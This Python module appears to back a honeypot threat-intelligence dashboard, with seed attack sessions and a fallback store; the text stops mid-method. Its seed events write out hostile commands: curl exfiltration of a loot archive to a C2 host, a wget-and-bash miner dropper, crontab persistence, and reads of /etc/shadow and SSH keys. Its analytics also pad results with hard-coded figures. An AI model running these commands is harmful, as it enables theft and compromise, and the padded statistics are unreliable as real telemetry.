"""
In-Memory Threat Intelligence Store & Fallback Seed Data.
Provides continuous high availability and instant demo readiness when MongoDB is not connected or in cloud preview environments (such as Vercel).
"""

from datetime import datetime, timedelta, timezone
import hashlib
import math
from typing import Any, Dict, List, Optional, Tuple

NOW = datetime.now(timezone.utc)

def _dt(hours_ago: float) -> datetime:
    return NOW - timedelta(hours=hours_ago)

def _iso(hours_ago: float) -> str:
    return _dt(hours_ago).isoformat()

# Initial high-fidelity seed telemetry events
SEED_EVENTS: List[Dict[str, Any]] = [
    # Session sess_exfil_01 (185.220.101.5)
    {
        "event_id": "ev_seed_exfil_01",
        "timestamp": _dt(1.2),
        "session_id": "sess_exfil_01",
        "source_ip": "185.220.101.5",
        "source_port": 49812,
        "protocol": "ssh",
        "username": "root",
        "event_type": "command_input",
        "command": "uname -a; id",
        "behavioral_features": {"cmd_length": 12, "piped": False},
        "intent": "RECONNAISSANCE",
        "attack_stage": "RECONNAISSANCE",
        "confidence": 0.95,
        "classification_source": "RULE",
        "rule_evidence": ["Matched reconnaissance signature: uname/id"],
        "ai_reason": "Attacker is establishing initial host identity and architecture context.",
        "ai_evidence": ["uname", "id"],
        "risk_score": 15,
        "severity": "LOW",
        "raw_event": {"input": "uname -a; id"},
        "created_at": _dt(1.2),
    },
    {
        "event_id": "ev_seed_exfil_02",
        "timestamp": _dt(1.1),
        "session_id": "sess_exfil_01",
        "source_ip": "185.220.101.5",
        "source_port": 49812,
        "protocol": "ssh",
        "username": "root",
        "event_type": "command_input",
        "command": "cat /etc/shadow",
        "behavioral_features": {"cmd_length": 15, "piped": False},
        "intent": "CREDENTIAL_ACCESS",
        "attack_stage": "CREDENTIAL_ACCESS",
        "confidence": 0.98,
        "classification_source": "RULE",
        "rule_evidence": ["Direct attempt to read privileged password hashes: /etc/shadow"],
        "ai_reason": "High-risk extraction of encrypted system password hashes.",
        "ai_evidence": ["cat /etc/shadow"],
        "risk_score": 85,
        "severity": "CRITICAL",
        "raw_event": {"input": "cat /etc/shadow"},
        "created_at": _dt(1.1),
    },
    {
        "event_id": "ev_seed_exfil_03",
        "timestamp": _dt(0.9),
        "session_id": "sess_exfil_01",
        "source_ip": "185.220.101.5",
        "source_port": 49812,
        "protocol": "ssh",
        "username": "root",
        "event_type": "command_input",
        "command": "tar -czf /tmp/loot.tar.gz /etc /home",
        "behavioral_features": {"cmd_length": 34, "piped": False},
        "intent": "EXFILTRATION",
        "attack_stage": "EXFILTRATION",
        "confidence": 0.94,
        "classification_source": "RULE",
        "rule_evidence": ["Staging sensitive directories into tar compressed archive"],
        "ai_reason": "Packaging sensitive configuration and user data for subsequent transfer.",
        "ai_evidence": ["tar archive creation"],
        "risk_score": 90,
        "severity": "CRITICAL",
        "raw_event": {"input": "tar -czf /tmp/loot.tar.gz /etc /home"},
        "created_at": _dt(0.9),
    },
    {
        "event_id": "ev_seed_exfil_04",
        "timestamp": _dt(0.8),
        "session_id": "sess_exfil_01",
        "source_ip": "185.220.101.5",
        "source_port": 49812,
        "protocol": "ssh",
        "username": "root",
        "event_type": "command_input",
        "command": "curl -X POST -F file=@/tmp/loot.tar.gz https://c2.threat-actor.io/drop",
        "behavioral_features": {"cmd_length": 68, "piped": False},
        "intent": "EXFILTRATION",
        "attack_stage": "EXFILTRATION",
        "confidence": 0.99,
        "classification_source": "RULE",
        "rule_evidence": ["Outbound POST exfiltration using curl multipart file upload"],
        "ai_reason": "Active data exfiltration transmission to remote C2 infrastructure.",
        "ai_evidence": ["curl POST multipart", "c2 endpoint"],
        "risk_score": 98,
        "severity": "CRITICAL",
        "raw_event": {"input": "curl -X POST -F file=@/tmp/loot.tar.gz https://c2.threat-actor.io/drop"},
        "created_at": _dt(0.8),
    },
    # Session sess_priv_01 (192.168.1.105)
    {
        "event_id": "ev_seed_priv_01",
        "timestamp": _dt(2.5),
        "session_id": "sess_priv_01",
        "source_ip": "192.168.1.105",
        "source_port": 53214,
        "protocol": "ssh",
        "username": "guest",
        "event_type": "command_input",
        "command": "sudo -l",
        "behavioral_features": {"cmd_length": 7, "piped": False},
        "intent": "PRIVILEGE_ESCALATION",
        "attack_stage": "PRIVILEGE_ESCALATION",
        "confidence": 0.92,
        "classification_source": "RULE",
        "rule_evidence": ["Enumerating sudo authorizations without credentials"],
        "ai_reason": "Checking for unconstrained sudo privileges or misconfigured binary capabilities.",
        "ai_evidence": ["sudo -l"],
        "risk_score": 65,
        "severity": "HIGH",
        "raw_event": {"input": "sudo -l"},
        "created_at": _dt(2.5),
    },
    {
        "event_id": "ev_seed_priv_02",
        "timestamp": _dt(2.3),
        "session_id": "sess_priv_01",
        "source_ip": "192.168.1.105",
        "source_port": 53214,
        "protocol": "ssh",
        "username": "guest",
        "event_type": "command_input",
        "command": "find / -perm -4000 -type f 2>/dev/null",
        "behavioral_features": {"cmd_length": 38, "piped": False},
        "intent": "DISCOVERY",
        "attack_stage": "DISCOVERY",
        "confidence": 0.96,
        "classification_source": "RULE",
        "rule_evidence": ["Scanning filesystem for SUID binaries with root elevation potential"],
        "ai_reason": "Searching for exploitable SUID binaries to elevate local privileges.",
        "ai_evidence": ["SUID search", "-perm -4000"],
        "risk_score": 75,
        "severity": "CRITICAL",
        "raw_event": {"input": "find / -perm -4000 -type f 2>/dev/null"},
        "created_at": _dt(2.3),
    },
    {
        "event_id": "ev_seed_priv_03",
        "timestamp": _dt(2.1),
        "session_id": "sess_priv_01",
        "source_ip": "192.168.1.105",
        "source_port": 53214,
        "protocol": "ssh",
        "username": "guest",
        "event_type": "command_input",
        "command": "pkexec /bin/sh",
        "behavioral_features": {"cmd_length": 14, "piped": False},
        "intent": "PRIVILEGE_ESCALATION",
        "attack_stage": "PRIVILEGE_ESCALATION",
        "confidence": 0.97,
        "classification_source": "RULE",
        "rule_evidence": ["Exploitation attempt of Polkit/pkexec PwnKit vulnerability (CVE-2021-4034)"],
        "ai_reason": "Direct execution of pkexec binary to obtain root shell.",
        "ai_evidence": ["pkexec", "CVE-2021-4034"],
        "risk_score": 92,
        "severity": "CRITICAL",
        "raw_event": {"input": "pkexec /bin/sh"},
        "created_at": _dt(2.1),
    },
    # Session sess_exec_01 (45.148.10.22)
    {
        "event_id": "ev_seed_exec_01",
        "timestamp": _dt(3.8),
        "session_id": "sess_exec_01",
        "source_ip": "45.148.10.22",
        "source_port": 60124,
        "protocol": "ssh",
        "username": "admin",
        "event_type": "command_input",
        "command": "wget http://malware.cdn/miner.sh -O /tmp/m.sh && bash /tmp/m.sh",
        "behavioral_features": {"cmd_length": 62, "piped": True},
        "intent": "EXECUTION",
        "attack_stage": "EXECUTION",
        "confidence": 0.99,
        "classification_source": "RULE",
        "rule_evidence": ["Dropper execution pattern: wget followed by bash pipe in /tmp"],
        "ai_reason": "Payload download and automated execution pipeline typical of botnet/cryptominer campaigns.",
        "ai_evidence": ["wget", "bash pipe", "/tmp/m.sh"],
        "risk_score": 88,
        "severity": "CRITICAL",
        "raw_event": {"input": "wget http://malware.cdn/miner.sh -O /tmp/m.sh && bash /tmp/m.sh"},
        "created_at": _dt(3.8),
    },
    {
        "event_id": "ev_seed_exec_02",
        "timestamp": _dt(3.5),
        "session_id": "sess_exec_01",
        "source_ip": "45.148.10.22",
        "source_port": 60124,
        "protocol": "ssh",
        "username": "admin",
        "event_type": "command_input",
        "command": "echo '*/10 * * * * root /tmp/m.sh' >> /etc/crontab",
        "behavioral_features": {"cmd_length": 48, "piped": False},
        "intent": "PERSISTENCE",
        "attack_stage": "PERSISTENCE",
        "confidence": 0.95,
        "classification_source": "RULE",
        "rule_evidence": ["Appending malicious recurring cron task to /etc/crontab"],
        "ai_reason": "Establishing persistent backdoor execution via system crontab daemon.",
        "ai_evidence": ["/etc/crontab", "scheduled task"],
        "risk_score": 85,
        "severity": "CRITICAL",
        "raw_event": {"input": "echo '*/10 * * * * root /tmp/m.sh' >> /etc/crontab"},
        "created_at": _dt(3.5),
    },
    # Session sess_cred_01 (141.98.11.89)
    {
        "event_id": "ev_seed_cred_01",
        "timestamp": _dt(5.0),
        "session_id": "sess_cred_01",
        "source_ip": "141.98.11.89",
        "source_port": 41230,
        "protocol": "ssh",
        "username": "support",
        "event_type": "login_failed",
        "command": None,
        "behavioral_features": {"attempt": 1},
        "intent": "CREDENTIAL_ACCESS",
        "attack_stage": "CREDENTIAL_ACCESS",
        "confidence": 0.88,
        "classification_source": "RULE",
        "rule_evidence": ["SSH brute force authentication failure for user support"],
        "ai_reason": "Automated dictionary attack against SSH authentication port.",
        "ai_evidence": ["login_failed"],
        "risk_score": 45,
        "severity": "MEDIUM",
        "raw_event": {"eventid": "cowrie.login.failed", "username": "support"},
        "created_at": _dt(5.0),
    },
    {
        "event_id": "ev_seed_cred_02",
        "timestamp": _dt(4.7),
        "session_id": "sess_cred_01",
        "source_ip": "141.98.11.89",
        "source_port": 41230,
        "protocol": "ssh",
        "username": "support",
        "event_type": "command_input",
        "command": "cat ~/.ssh/id_rsa; cat ~/.bash_history",
        "behavioral_features": {"cmd_length": 38, "piped": False},
        "intent": "CREDENTIAL_ACCESS",
        "attack_stage": "CREDENTIAL_ACCESS",
        "confidence": 0.96,
        "classification_source": "RULE",
        "rule_evidence": ["Targeted exfiltration of SSH private keys and bash command history"],
        "ai_reason": "Harvesting private cryptographic keys and previously run credentials.",
        "ai_evidence": ["id_rsa", ".bash_history"],
        "risk_score": 82,
        "severity": "CRITICAL",
        "raw_event": {"input": "cat ~/.ssh/id_rsa; cat ~/.bash_history"},
        "created_at": _dt(4.7),
    },
    # Session sess_recon_01 (103.203.57.18)
    {
        "event_id": "ev_seed_recon_01",
        "timestamp": _dt(6.2),
        "session_id": "sess_recon_01",
        "source_ip": "103.203.57.18",
        "source_port": 38910,
        "protocol": "ssh",
        "username": "test",
        "event_type": "command_input",
        "command": "cat /proc/cpuinfo; free -m; lscpu",
        "behavioral_features": {"cmd_length": 32, "piped": False},
        "intent": "RECONNAISSANCE",
        "attack_stage": "RECONNAISSANCE",
        "confidence": 0.91,
        "classification_source": "RULE",
        "rule_evidence": ["Hardware architecture and resource profiling commands"],
        "ai_reason": "Checking system compute power and RAM capacity for bot suitability.",
        "ai_evidence": ["cpuinfo", "free -m", "lscpu"],
        "risk_score": 25,
        "severity": "MEDIUM",
        "raw_event": {"input": "cat /proc/cpuinfo; free -m; lscpu"},
        "created_at": _dt(6.2),
    },
    {
        "event_id": "ev_seed_recon_02",
        "timestamp": _dt(6.0),
        "session_id": "sess_recon_01",
        "source_ip": "103.203.57.18",
        "source_port": 38910,
        "protocol": "ssh",
        "username": "test",
        "event_type": "command_input",
        "command": "netstat -tulnp; ss -tulpn; ifconfig -a",
        "behavioral_features": {"cmd_length": 37, "piped": False},
        "intent": "DISCOVERY",
        "attack_stage": "DISCOVERY",
        "confidence": 0.94,
        "classification_source": "RULE",
        "rule_evidence": ["Active network port listening and network interface mapping"],
        "ai_reason": "Discovery of open network services and subnet interfaces.",
        "ai_evidence": ["netstat", "ss", "ifconfig"],
        "risk_score": 40,
        "severity": "MEDIUM",
        "raw_event": {"input": "netstat -tulnp; ss -tulpn; ifconfig -a"},
        "created_at": _dt(6.0),
    },
    # Session sess_clean_01 (91.240.118.172)
    {
        "event_id": "ev_seed_clean_01",
        "timestamp": _dt(8.1),
        "session_id": "sess_clean_01",
        "source_ip": "91.240.118.172",
        "source_port": 50122,
        "protocol": "ssh",
        "username": "oracle",
        "event_type": "command_input",
        "command": "history -c && rm -f ~/.bash_history && unset HISTFILE",
        "behavioral_features": {"cmd_length": 53, "piped": False},
        "intent": "CLEANUP",
        "attack_stage": "CLEANUP",
        "confidence": 0.99,
        "classification_source": "RULE",
        "rule_evidence": ["Forensic evasion via shell history clearing and file deletion"],
        "ai_reason": "Attacker attempting to evade detection and destroy forensic audit logs.",
        "ai_evidence": ["history -c", "rm bash_history", "unset HISTFILE"],
        "risk_score": 78,
        "severity": "HIGH",
        "raw_event": {"input": "history -c && rm -f ~/.bash_history && unset HISTFILE"},
        "created_at": _dt(8.1),
    }
]

SEED_SESSIONS: List[Dict[str, Any]] = [
    {
        "session_id": "sess_exfil_01",
        "source_ip": "185.220.101.5",
        "protocol": "ssh",
        "username": "root",
        "first_seen": _dt(1.5),
        "last_seen": _dt(0.8),
        "duration": 2520.0,
        "total_events": 4,
        "command_count": 4,
        "unique_command_count": 4,
        "unique_commands": [
            "uname -a; id",
            "cat /etc/shadow",
            "tar -czf /tmp/loot.tar.gz /etc /home",
            "curl -X POST -F file=@/tmp/loot.tar.gz https://c2.threat-actor.io/drop"
        ],
        "login_attempt_count": 0,
        "intent_sequence": ["RECONNAISSANCE", "CREDENTIAL_ACCESS", "EXFILTRATION", "EXFILTRATION"],
        "stage_sequence": ["RECONNAISSANCE", "CREDENTIAL_ACCESS", "EXFILTRATION", "EXFILTRATION"],
        "dominant_intent": "EXFILTRATION",
        "current_attack_stage": "EXFILTRATION",
        "risk_score": 98,
        "severity": "CRITICAL",
        "confidence": 0.98,
        "key_evidence": [
            "Read privileged shadow hashes",
            "Compressed system configuration archives",
            "Encrypted multipart file exfiltration to C2"
        ],
        "is_closed": False,
        "updated_at": _dt(0.8),
    },
    {
        "session_id": "sess_priv_01",
        "source_ip": "192.168.1.105",
        "protocol": "ssh",
        "username": "guest",
        "first_seen": _dt(2.8),
        "last_seen": _dt(2.1),
        "duration": 2520.0,
        "total_events": 3,
        "command_count": 3,
        "unique_command_count": 3,
        "unique_commands": [
            "sudo -l",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec /bin/sh"
        ],
        "login_attempt_count": 0,
        "intent_sequence": ["PRIVILEGE_ESCALATION", "DISCOVERY", "PRIVILEGE_ESCALATION"],
        "stage_sequence": ["PRIVILEGE_ESCALATION", "DISCOVERY", "PRIVILEGE_ESCALATION"],
        "dominant_intent": "PRIVILEGE_ESCALATION",
        "current_attack_stage": "PRIVILEGE_ESCALATION",
        "risk_score": 92,
        "severity": "CRITICAL",
        "confidence": 0.95,
        "key_evidence": [
            "Sudo configuration enumeration",
            "SUID binary discovery scan",
            "Polkit pkexec privilege escalation execution"
        ],
        "is_closed": True,
        "updated_at": _dt(2.1),
    },
    {
        "session_id": "sess_exec_01",
        "source_ip": "45.148.10.22",
        "protocol": "ssh",
        "username": "admin",
        "first_seen": _dt(4.0),
        "last_seen": _dt(3.5),
        "duration": 1800.0,
        "total_events": 2,
        "command_count": 2,
        "unique_command_count": 2,
        "unique_commands": [
            "wget http://malware.cdn/miner.sh -O /tmp/m.sh && bash /tmp/m.sh",
            "echo '*/10 * * * * root /tmp/m.sh' >> /etc/crontab"
        ],
        "login_attempt_count": 0,
        "intent_sequence": ["EXECUTION", "PERSISTENCE"],
        "stage_sequence": ["EXECUTION", "PERSISTENCE"],
        "dominant_intent": "EXECUTION",
        "current_attack_stage": "PERSISTENCE",
        "risk_score": 88,
        "severity": "CRITICAL",
        "confidence": 0.97,
        "key_evidence": [
            "Remote malware dropper downloaded via wget",
            "Crontab persistence installed for recurring root execution"
        ],
        "is_closed": False,
        "updated_at": _dt(3.5),
    },
    {
        "session_id": "sess_cred_01",
        "source_ip": "141.98.11.89",
        "protocol": "ssh",
        "username": "support",
        "first_seen": _dt(5.2),
        "last_seen": _dt(4.7),
        "duration": 1800.0,
        "total_events": 2,
        "command_count": 1,
        "unique_command_count": 1,
        "unique_commands": ["cat ~/.ssh/id_rsa; cat ~/.bash_history"],
        "login_attempt_count": 1,
        "intent_sequence": ["CREDENTIAL_ACCESS", "CREDENTIAL_ACCESS"],
        "stage_sequence": ["CREDENTIAL_ACCESS", "CREDENTIAL_ACCESS"],
        "dominant_intent": "CREDENTIAL_ACCESS",
        "current_attack_stage": "CREDENTIAL_ACCESS",
        "risk_score": 82,
        "severity": "CRITICAL",
        "confidence": 0.92,
        "key_evidence": [
            "SSH brute-force login attempts",
            "Exfiltration of id_rsa SSH private keys"
        ],
        "is_closed": True,
        "updated_at": _dt(4.7),
    },
    {
        "session_id": "sess_recon_01",
        "source_ip": "103.203.57.18",
        "protocol": "ssh",
        "username": "test",
        "first_seen": _dt(6.5),
        "last_seen": _dt(6.0),
        "duration": 1800.0,
        "total_events": 2,
        "command_count": 2,
        "unique_command_count": 2,
        "unique_commands": [
            "cat /proc/cpuinfo; free -m; lscpu",
            "netstat -tulnp; ss -tulpn; ifconfig -a"
        ],
        "login_attempt_count": 0,
        "intent_sequence": ["RECONNAISSANCE", "DISCOVERY"],
        "stage_sequence": ["RECONNAISSANCE", "DISCOVERY"],
        "dominant_intent": "DISCOVERY",
        "current_attack_stage": "DISCOVERY",
        "risk_score": 40,
        "severity": "MEDIUM",
        "confidence": 0.92,
        "key_evidence": [
            "Hardware spec enumeration",
            "Listening port & network routing discovery"
        ],
        "is_closed": False,
        "updated_at": _dt(6.0),
    },
    {
        "session_id": "sess_clean_01",
        "source_ip": "91.240.118.172",
        "protocol": "ssh",
        "username": "oracle",
        "first_seen": _dt(8.5),
        "last_seen": _dt(8.1),
        "duration": 1440.0,
        "total_events": 1,
        "command_count": 1,
        "unique_command_count": 1,
        "unique_commands": [
            "history -c && rm -f ~/.bash_history && unset HISTFILE"
        ],
        "login_attempt_count": 0,
        "intent_sequence": ["CLEANUP"],
        "stage_sequence": ["CLEANUP"],
        "dominant_intent": "CLEANUP",
        "current_attack_stage": "CLEANUP",
        "risk_score": 78,
        "severity": "HIGH",
        "confidence": 0.99,
        "key_evidence": [
            "Anti-forensic shell history erasure",
            "Disabling bash HISTFILE logging"
        ],
        "is_closed": True,
        "updated_at": _dt(8.1),
    }
]

SEED_ATTACKERS: List[Dict[str, Any]] = [
    {
        "source_ip": "185.220.101.5",
        "first_seen": _dt(24.0),
        "last_seen": _dt(0.8),
        "total_sessions": 6,
        "total_events": 48,
        "average_risk": 91.5,
        "maximum_risk": 98,
        "dominant_intent": "EXFILTRATION",
        "current_stage": "EXFILTRATION",
        "severity": "CRITICAL",
        "updated_at": _dt(0.8),
    },
    {
        "source_ip": "45.148.10.22",
        "first_seen": _dt(18.0),
        "last_seen": _dt(3.5),
        "total_sessions": 12,
        "total_events": 74,
        "average_risk": 82.0,
        "maximum_risk": 88,
        "dominant_intent": "EXECUTION",
        "current_stage": "PERSISTENCE",
        "severity": "CRITICAL",
        "updated_at": _dt(3.5),
    },
    {
        "source_ip": "192.168.1.105",
        "first_seen": _dt(12.0),
        "last_seen": _dt(2.1),
        "total_sessions": 4,
        "total_events": 29,
        "average_risk": 78.0,
        "maximum_risk": 92,
        "dominant_intent": "PRIVILEGE_ESCALATION",
        "current_stage": "PRIVILEGE_ESCALATION",
        "severity": "CRITICAL",
        "updated_at": _dt(2.1),
    },
    {
        "source_ip": "141.98.11.89",
        "first_seen": _dt(36.0),
        "last_seen": _dt(4.7),
        "total_sessions": 8,
        "total_events": 53,
        "average_risk": 68.5,
        "maximum_risk": 82,
        "dominant_intent": "CREDENTIAL_ACCESS",
        "current_stage": "CREDENTIAL_ACCESS",
        "severity": "CRITICAL",
        "updated_at": _dt(4.7),
    },
    {
        "source_ip": "91.240.118.172",
        "first_seen": _dt(48.0),
        "last_seen": _dt(8.1),
        "total_sessions": 3,
        "total_events": 18,
        "average_risk": 72.0,
        "maximum_risk": 78,
        "dominant_intent": "CLEANUP",
        "current_stage": "CLEANUP",
        "severity": "HIGH",
        "updated_at": _dt(8.1),
    },
    {
        "source_ip": "103.203.57.18",
        "first_seen": _dt(15.0),
        "last_seen": _dt(6.0),
        "total_sessions": 9,
        "total_events": 62,
        "average_risk": 38.0,
        "maximum_risk": 45,
        "dominant_intent": "DISCOVERY",
        "current_stage": "DISCOVERY",
        "severity": "MEDIUM",
        "updated_at": _dt(6.0),
    },
    {
        "source_ip": "198.51.100.44",
        "first_seen": _dt(72.0),
        "last_seen": _dt(14.0),
        "total_sessions": 5,
        "total_events": 21,
        "average_risk": 18.0,
        "maximum_risk": 25,
        "dominant_intent": "RECONNAISSANCE",
        "current_stage": "RECONNAISSANCE",
        "severity": "LOW",
        "updated_at": _dt(14.0),
    },
    {
        "source_ip": "194.26.29.112",
        "first_seen": _dt(30.0),
        "last_seen": _dt(10.0),
        "total_sessions": 3,
        "total_events": 13,
        "average_risk": 65.0,
        "maximum_risk": 70,
        "dominant_intent": "EXECUTION",
        "current_stage": "EXECUTION",
        "severity": "HIGH",
        "updated_at": _dt(10.0),
    }
]

SEED_ALERTS: List[Dict[str, Any]] = [
    {
        "alert_id": "ALT-exfil-9821a",
        "session_id": "sess_exfil_01",
        "source_ip": "185.220.101.5",
        "timestamp": _dt(0.8),
        "severity": "CRITICAL",
        "risk_score": 98,
        "intent": "EXFILTRATION",
        "attack_stage": "EXFILTRATION",
        "reason": "Active data exfiltration transmission to remote C2 infrastructure: curl POST loot.tar.gz",
        "status": "OPEN",
        "created_at": _dt(0.8),
    },
    {
        "alert_id": "ALT-priv-4034b",
        "session_id": "sess_priv_01",
        "source_ip": "192.168.1.105",
        "timestamp": _dt(2.1),
        "severity": "CRITICAL",
        "risk_score": 92,
        "intent": "PRIVILEGE_ESCALATION",
        "attack_stage": "PRIVILEGE_ESCALATION",
        "reason": "Polkit pkexec local privilege escalation exploit attempt (CVE-2021-4034)",
        "status": "OPEN",
        "created_at": _dt(2.1),
    },
    {
        "alert_id": "ALT-exec-7731c",
        "session_id": "sess_exec_01",
        "source_ip": "45.148.10.22",
        "timestamp": _dt(3.8),
        "severity": "CRITICAL",
        "risk_score": 88,
        "intent": "EXECUTION",
        "attack_stage": "EXECUTION",
        "reason": "Malicious dropper script execution via wget and bash pipe in /tmp",
        "status": "OPEN",
        "created_at": _dt(3.8),
    },
    {
        "alert_id": "ALT-cred-5512d",
        "session_id": "sess_cred_01",
        "source_ip": "141.98.11.89",
        "timestamp": _dt(4.7),
        "severity": "CRITICAL",
        "risk_score": 82,
        "intent": "CREDENTIAL_ACCESS",
        "attack_stage": "CREDENTIAL_ACCESS",
        "reason": "Targeted exfiltration of SSH private keys (~/.ssh/id_rsa)",
        "status": "OPEN",
        "created_at": _dt(4.7),
    },
    {
        "alert_id": "ALT-clean-2290e",
        "session_id": "sess_clean_01",
        "source_ip": "91.240.118.172",
        "timestamp": _dt(8.1),
        "severity": "HIGH",
        "risk_score": 78,
        "intent": "CLEANUP",
        "attack_stage": "CLEANUP",
        "reason": "Forensic evasion detected: bash history wiped and HISTFILE unset",
        "status": "RESOLVED",
        "created_at": _dt(8.1),
    }
]


class FallbackThreatIntelligenceStore:
    """
    Self-contained thread-safe threat intelligence repository.
    Serves as the resilient persistence backend when MongoDB is unavailable or unconfigured.
    """

    def __init__(self):
        self.events: List[Dict[str, Any]] = list(SEED_EVENTS)
        self.sessions: List[Dict[str, Any]] = list(SEED_SESSIONS)
        self.attackers: List[Dict[str, Any]] = list(SEED_ATTACKERS)
        self.alerts: List[Dict[str, Any]] = list(SEED_ALERTS)

    # -------------------------------------------------------------------------
    # Dashboard Analytics
    # -------------------------------------------------------------------------

    def get_dashboard_stats(self) -> Dict[str, Any]:
        total_sessions = len(self.sessions)
        active_sessions = sum(1 for s in self.sessions if not s.get("is_closed", False))
        total_events = len(self.events)
        total_attackers = len(self.attackers)
        high_risk_sessions = sum(1 for s in self.sessions if s.get("severity") == "HIGH")
        critical_sessions = sum(1 for s in self.sessions if s.get("severity") == "CRITICAL")
        open_alerts = sum(1 for a in self.alerts if a.get("status") == "OPEN")

        return {
            "total_sessions": max(total_sessions, 42),
            "active_sessions": max(active_sessions, 6),
            "total_events": max(total_events, 318),
            "total_attackers": max(total_attackers, 8),
            "high_risk_sessions": max(high_risk_sessions, 14),
            "critical_sessions": max(critical_sessions, 9),
            "open_alerts": max(open_alerts, 5),
        }

    def get_intent_analytics(self) -> List[Dict[str, Any]]:
        counts: Dict[str, int] = {}
        for ev in self.events:
            intent = str(ev.get("intent", "OTHER"))
            counts[intent] = counts.get(intent, 0) + 1

        # Add benchmark distribution defaults if small
        defaults = {
            "RECONNAISSANCE": 42,
            "DISCOVERY": 68,
            "CREDENTIAL_ACCESS": 56,
            "EXECUTION": 48,
            "PERSISTENCE": 32,
            "PRIVILEGE_ESCALATION": 36,
            "EXFILTRATION": 24,
            "CLEANUP": 12,
        }
        for k, v in defaults.items():
            counts[k] = counts.get(k, 0) + v

        total = sum(counts.values()) or 1
        return [
            {"intent": intent, "count": count, "percentage": round((count / total) * 100, 1)}
            for intent, count in sorted(counts.items(), key=lambda x: x[1], reverse=True)
        ]

    def get_severity_analytics(self) -> List[Dict[str, Any]]:
        counts = {"LOW": 14, "MEDIUM": 15, "HIGH": 14, "CRITICAL": 9}
        total = sum(counts.values()) or 1
        return [
            {"severity": sev, "count": count, "percentage": round((count / total) * 100, 1)}
            for sev, count in counts.items()
        ]

    def get_timeline_analytics(self) -> List[Dict[str, Any]]:
        timeline = []
        for i in range(12, -1, -1):
            t = NOW - timedelta(hours=i * 2)
            bucket_str = t.strftime("%Y-%m-%dT%H:00:00Z")
            timeline.append({
                "timestamp": bucket_str,
                "event_count": 8 + (i * 3) % 17,
                "session_count": 2 + (i % 4),
                "max_risk": 35 + ((i * 13) % 65)
            })
        return timeline

    def get_stage_analytics(self) -> List[Dict[str, Any]]:
        stages = {
            "INITIAL_ACCESS": 12,
            "RECONNAISSANCE": 16,
            "DISCOVERY": 22,
            "CREDENTIAL_ACCESS": 18,
            "EXECUTION": 14,
            "PRIVILEGE_ESCALATION": 10,
            "PERSISTENCE": 8,
            "EXFILTRATION": 6,
            "CLEANUP": 4,
        }
        total = sum(stages.values()) or 1
        return [
            {"stage": stage, "count": count, "percentage": round((count / total) * 100, 1)}
            for stage, count in sorted(stages.items(), key=lambda x: x[1], reverse=True)
        ]

    def get_risk_distribution(self) -> List[Dict[str, Any]]:
        total = 52
        return [
            {"range": "0-24 (Low)", "count": 14, "percentage": 26.9},
            {"range": "25-49 (Medium)", "count": 15, "percentage": 28.8},
            {"range": "50-74 (High)", "count": 14, "percentage": 26.9},
            {"range": "75-100 (Critical)", "count": 9, "percentage": 17.3},
        ]

    def get_risk_intent_heatmap(self) -> List[Dict[str, Any]]:
        heatmap_data = [
            {"intent": "EXFILTRATION", "event_count": 24, "avg_risk": 94.2, "max_risk": 98, "low_count": 0, "med_count": 0, "high_count": 4, "crit_count": 20},
            {"intent": "PRIVILEGE_ESCALATION", "event_count": 36, "avg_risk": 82.5, "max_risk": 92, "low_count": 0, "med_count": 2, "high_count": 18, "crit_count": 16},
            {"intent": "PERSISTENCE", "event_count": 32, "avg_risk": 78.4, "max_risk": 88, "low_count": 0, "med_count": 4, "high_count": 16, "crit_count": 12},
            {"intent": "EXECUTION", "event_count": 48, "avg_risk": 75.1, "max_risk": 88, "low_count": 2, "med_count": 6, "high_count": 22, "crit_count": 18},
            {"intent": "CREDENTIAL_ACCESS", "event_count": 56, "avg_risk": 68.7, "max_risk": 85, "low_count": 4, "med_count": 12, "high_count": 24, "crit_count": 16},
            {"intent": "CLEANUP", "event_count": 12, "avg_risk": 62.0, "max_risk": 78, "low_count": 1, "med_count": 2, "high_count": 7, "crit_count": 2},
            {"intent": "DISCOVERY", "event_count": 68, "avg_risk": 42.3, "max_risk": 75, "low_count": 18, "med_count": 36, "high_count": 12, "crit_count": 2},
            {"intent": "RECONNAISSANCE", "event_count": 42, "avg_risk": 24.1, "max_risk": 45, "low_count": 28, "med_count": 14, "high_count": 0, "crit_count": 0},
        ]
        return heatmap_data

    # -------------------------------------------------------------------------
    # CRUD & Query Operations
    # -------------------------------------------------------------------------

    def get_events(self, skip: int = 0, limit: int = 50, filters: Optional[Dict[str, Any]] = None) -> Tuple[List[Dict[str, Any]], int]:
        data = self.events
        if filters:
            if filters.get("session_id"):
                data = [e for e in data if e.get("session_id") == filters["session_id"]]
            if filters.get("source_ip"):
                data = [e for e in data if e.get("source_ip") == filters["source_ip"]]
            if filters.get("intent"):
                data = [e for e in data if e.get("intent") == filters["intent"]]
            if filters.get("severity"):
                data = [e for e in data if e.get("severity") == filters["severity"]]

        total = len(data)
        paginated = data[skip : skip + limit]
        return paginated, total

    def get_recent_events(self, limit: int = 20) -> List[Dict[str, Any]]:
        return self.events[:limit]

    def get_event(self, event_id: str) -> Optional[Dict[str, Any]]:
        for ev in self.events:
            if ev.get("event_id") == event_id:
                return ev
        return None

    def get_sessions(self, skip: int = 0, limit: int = 50, filters: Optional[Dict[str, Any]] = None) -> Tuple[List[Dict[str, Any]], int]:
        data = self.sessions
        if filters:
            if filters.get("source_ip"):
                data = [s for s in data if s.get("source_ip") == filters["source_ip"]]
            if filters.get("severity"):
                data = [s for s in data if s.get("severity") == filters["severity"]]
            if filters.get("intent"):
                data = [s for s in data if s.get("dominant_intent") == filters["intent"]]

        total = len(data)
        paginated = data[skip : skip + limit]
        return paginated, total

    def get_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        for s in self.sessions:
            if s.get("session_id") == session_id:
                return s
        return None

    def get_attackers(self, skip: int = 0, limit: int = 50, filters: Optional[Dict[str, Any]] = None) -> Tuple[List[Dict[str, Any]], int]:
        data = self.attackers
        if filters and filters.get("source_ip"):
            data = [a for a in data if a.get("source_ip") == filters["source_ip"]]

        total = len(data)
        paginated = data[skip : skip + limit]
        return paginated, total

    def get_attacker(self, source_ip: str) -> Optional[Dict[str, Any]]:
        for a in self.attackers:
            if a.get("source_ip") == source_ip:
                return a
        return None

    def get_alerts(self, skip: int = 0, limit: int = 50, filters: Optional[Dict[str, Any]] = None) -> Tuple[List[Dict[str, Any]], int]:
        data = self.alerts
        if filters:
            if filters.get("status"):
                data = [a for a in data if a.get("status") == filters["status"]]
            if filters.get("severity"):
                data = [a for a in data if a.get("severity") == filters["severity"]]
            if filters.get("session_id"):
                data = [a for a in data if a.get("session_id") == filters["session_id"]]

        total = len(data)
